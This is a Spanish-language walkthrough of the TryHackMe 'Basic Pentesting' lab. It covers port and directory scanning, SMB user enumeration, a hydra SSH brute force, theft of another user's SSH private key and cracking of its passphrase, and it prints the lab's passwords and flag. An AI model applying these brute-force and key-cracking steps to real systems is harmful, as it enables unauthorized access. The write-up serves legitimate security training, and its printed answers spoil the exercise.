
# Write-up: 

- **Nombre de la máquina:** `Basic Pentesting` 
- **Plataforma:** `TryHackMe` 
- **IP:** `10.10.84.9`  y `10.10.172.211`
- **SO:** `Linux` 
- **Dificultad:** `Easy`
- https://tryhackme.com/room/basicpentestingjt

---

## 1. RECONOCIMIENTO

El objetivo de esta fase es identificar los puntos de entrada y servicios expuestos en la máquina víctima.

#### 1.1. Verificación de Conectividad

Se lanza un `ping` para confirmar que la máquina está activa.
```
	ping 10.10.84.9
```
Nos devuelve conectividad y un TTL=64 lo que sugiere que estamos ante una máquina Linux.

<p align="center">
    <img src="Imagenes/72.png" width="1000">
</p>


#### 1.2. Escaneo de Puertos

Se realiza un escaneo con **Nmap** para descubrir puertos abiertos, los servicios que corren en ellos y sus versiones.

```
sudo nmap -p- -sV -sC -sS --min-rate 5000 --open -n -Pn 10.10.143.132 -oN port_scan.txt
```

**Puertos Descubiertos:**

| Puerto | Servicio | Versión       | Notas                              |
| ------ | -------- | ------------- | ---------------------------------- |
| 22     | ssh      | OpenSSH 7.6   | Necesitamos credenciales           |
| 80     | http     | Apache 2.4.29 | Servidor web; Iniciaremos por aquí |




<p align="center">
    <img src="Imagenes/73.png" width="1000">
</p>


---

## 2. ENUMERACIÓN

Una vez identificados los servicios, se procede a investigarlos en profundidad en busca de vulnerabilidades o información útil.

### Puerto 80 ( HTTP)

#### Enumeración Manual:

- **Navegación web:**  Al visitar  `http://10.10.84.9` tenemos  página que nos indica estar bajo mantenimiento: 

<p align="center">
    <img src="Imagenes/74.png" width="1000">
</p>

- **Análisis del código fuente:** Se revisa el HTML en busca de comentarios, rutas o scripts ocultos. Un comentario sugiere revisar una nota  en la sección dev . :

<p align="center">
    <img src="Imagenes/75.png" width="1000">
</p>

- **Rutas comunes:** Se comprueban sin éxito rutas comunes como `/robots.txt`, `/admin`, y `/backup`."

#### Enumeración Automática:

- Lanzamos la herramienta `whatweb` para que nos de información sobre la aplicación web. 
```
whatweb 10.10.10.84.9
```

<p align="center">
    <img src="Imagenes/76.png" width="1000">
</p>


- Lanzamos la herramienta de enumeración `gobuster` para buscar directorios ocultos y extensiones .php,.txt y .html 

```
gobuster dir -u http://10.10.84.9/ -w /urs/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,txt,html -k
```


<p align="center">
    <img src="Imagenes/77.png" width="1000">
</p>

**Hallazgos:**

- Confirmamos el directorio `/development`

### Enumeración `/development`

Al acceder a `/development`, se encuentran dos archivos de texto: `/dev.txt` y `/j.txt`.
<p align="center">
    <img src="Imagenes/78.png" width="1000">
</p>

-  /dev.txt:<p align="center">
    <img src="Imagenes/79.png" width="1000">
</p>

-  /j.txt: <p align="center">
    <img src="Imagenes/80.png" width="1000">
</p>

**Hallazgos**
- Se está trabajando con la versión 2.5.12 de Apache. Con vulnerabilidades conocidas. 
- Tienen un servicio SMB activo. 
### Enumeración SMB:

Dado que SMB está activo, se utiliza la herramienta `enum4linux` para buscar recursos compartidos y usuarios del sistema.
  ```
  enum4linux -a 10.10.84.9
  ```

<p align="center">
    <img src="Imagenes/81.png" width="1000">
</p>

**Hallazgos**
- Usuarios: `kay` y `jan`

### 22(SSH)

Utilizando la lista de usuarios, se lanza un ataque de **fuerza bruta** contra el servicio SSH para obtener credenciales válidas.

```
hydra -t 4 -l jan  -P /usr/share/wordlists/rockyou.txt ssh://10.10.84.9
```


<p align="center">
    <img src="Imagenes/82.png" width="1000">
</p>

**Credenciales obtenidas:**
- **Usuario:** `jan`
- **Contraseña:** `armando`

---

## 3. EXPLOTACIÓN

### 3.1 Acceso inicial:

Con las credenciales descubiertas con `hydra`  nos conectamos al servicio ssh: 

*La IP objetivo ha cambiado a `10.10.172.211` desde el escaneo inicial, lo que se debe a la dinámica de la plataforma*

```
ssh jan@10.10.172.211
```

<p align="center">
    <img src="Imagenes/83.png" width="1000">
</p>

---

## 4. ESCALADA DE PRIVILEGIOS

### 4.1. Enumeración Interna

Se realizan comprobaciones básicas.

#### Comprobaciones del sistema:

¿Qué usuario somos?
`whoami`

<p align="center">
    <img src="Imagenes/84.png" width="1000">
</p>

¿A que grupo pertenecemos? `id`
<p align="center">
    <img src="Imagenes/85.png" width="1000">
</p>

¿Qué usuario hay en el sistema?
`cd home` y `ls`

<p align="center">
    <img src="Imagenes/86.png" width="1000">
</p>

Revisamos los directorios de los usuarios:
`kay` :

<p align="center">
    <img src="Imagenes/87.png" width="1000">
</p>


- **Hallazgos**:
    - No tenemos permiso para ver pass.bak
    - En el directorio de `kay` tenemos las claves para el acceso por el servicio ssh. ![[88.png]]

El objetivo es pivotar a `kay` usando esta clave.

### 4.2 Pivotar a usuario kay

#### 4.2.1 Cracking de contraseña

Se intenta descifrar la clave privada SSH `id_rsa` protegida con una _passphrase_.

1. Descargamos el archivo `id_rsa` a nuestra máquina utilizando `SCP`

```
scp jan@10.10.172.211:/home/kay/.ssh/id_rsa .
```
<p align="center">
    <img src="Imagenes/89.png" width="1000">
</p>

2. Se utiliza `ssh2john` para convertir el formato de la clave al hash que John the Ripper puede procesar.
```
ssh2john id_rsa > id_rsa.txt
```
3. Crackeamos la `passphrase` con john :

```
john id_rsa.txt --wordlist=/usr/share/wordlist/rockyou.txt
```

<p align="center">
    <img src="Imagenes/90.png" width="1000">
</p>

**Hallazgos**
- La passphrase de id_rsa es `beewax`

#### Acceso final como kay

Teniendo ya credenciales:
1.  Se cambian los permisos al archivo que descargamos previamente `ìd_rsa`.
```
chmod 600 id_rsa
```
2. Se establece la conexión SSH con la clave y la _passphrase_ crackeada:
```
ssh -i id_rsa kay@10.10.172.211
```

<p align="center">
    <img src="Imagenes/91.png" width="1000">
</p>

---

## 5. CAPTURA DE BANDERAS (FLAGS)

Con acceso como usuario **`kay`**, se procede a buscar y leer la bandera final.

#### Bandera de kay (pass.bak)

- **Ubicación:** `/pass.bak`
    
- **Contenido:** `heresareallystrongpasswordthatfollowsthepasswordpolicy$$`
    
<p align="center">
    <img src="Imagenes/92.png" width="1000">
</p>
Respuestas en THM:

<p align="center">
    <img src="Imagenes/93.png" width="1000">
</p>
Todas se han ido resolviendo en el transcurso de la resolución de la máquina 
